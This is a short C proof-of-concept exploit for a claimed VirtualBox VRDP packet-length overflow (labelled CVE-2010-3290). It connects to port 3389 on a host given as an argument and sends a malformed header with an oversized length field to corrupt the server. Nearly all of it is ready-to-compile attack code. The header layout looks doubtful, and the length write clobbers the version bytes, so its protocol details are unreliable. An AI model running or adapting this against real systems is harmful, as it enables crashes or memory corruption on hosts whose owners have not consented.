/*
 * PoC for VirtualBox VRDP packet length overflow (CVE-2010-3290)
 *
 * Connects to the VRDP port on the host and sends a
 * malformed header with an oversized payload length,
 * overflowing the server’s packet buffer.
 *
 * Compile: gcc -o poc_vrdp poc_vrdp.c
 */

#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define VRDP_PORT 3389  // default VRDP (RDP) port

int main(int argc, char **argv) {
    const char *host = argc > 1 ? argv[1] : "127.0.0.1";
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) { perror("socket"); return 1; }

    struct sockaddr_in sa = {0};
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(VRDP_PORT);
    inet_pton(AF_INET, host, &sa.sin_addr);

    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
        perror("connect");
        return 1;
    }
    printf("[+] Connected to VRDP %s:%d\n", host, VRDP_PORT);

    // VRDP initial header: 'RDP' magic + version
    char hdr[8] = { 'R','D','P',0x00, 0x01,0x00, 0x00,0x00 };
    // Overwrite length fields to a huge value
    uint32_t *plen = (uint32_t*)(hdr + 4);
    *plen = htonl(0xFFFFFFF0);

    printf("[+] Sending oversized VRDP header length=0x%08x\n", ntohl(*plen));
    write(sock, hdr, sizeof(hdr));
    printf("[+] Packet sent, host VRDP server may be corrupted\n");
    close(sock);
    return 0;
}